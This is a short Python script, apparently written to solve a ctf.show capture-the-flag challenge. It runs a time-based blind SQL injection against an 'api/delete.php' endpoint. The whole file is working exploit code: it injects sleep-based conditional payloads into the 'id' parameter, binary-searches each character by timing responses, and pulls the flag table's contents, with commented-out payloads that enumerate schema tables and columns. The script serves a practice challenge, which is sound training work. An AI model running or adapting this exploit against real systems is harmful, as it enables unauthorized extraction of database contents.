import requests
import time

url = "http://83ffd6a7-92ca-4986-b2bb-23277e12bc5c.challenge.ctf.show/api/delete.php"
# payload='select group_concat(table_name) from information_schema.tables where table_schema=database()'
# payload='select group_concat(column_name) from information_schema.columns where table_name="flag"'
payload = 'select flag from flag'
i = 0
flag = ''
while True:
    i = i + 1
    start = 32
    end = 127
    while start < end:
        mid = (start + end) >> 1
        data = {
            'id': f'if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.1),0)#'
        }
        try:
            res = requests.post(url, data=data, timeout=2)
            end = mid
        except Exception as e:
            start = mid + 1
        time.sleep(0.2)
    print(start)
    if start != 32:
        flag = flag + chr(start)
    else:
        break
    print(flag)
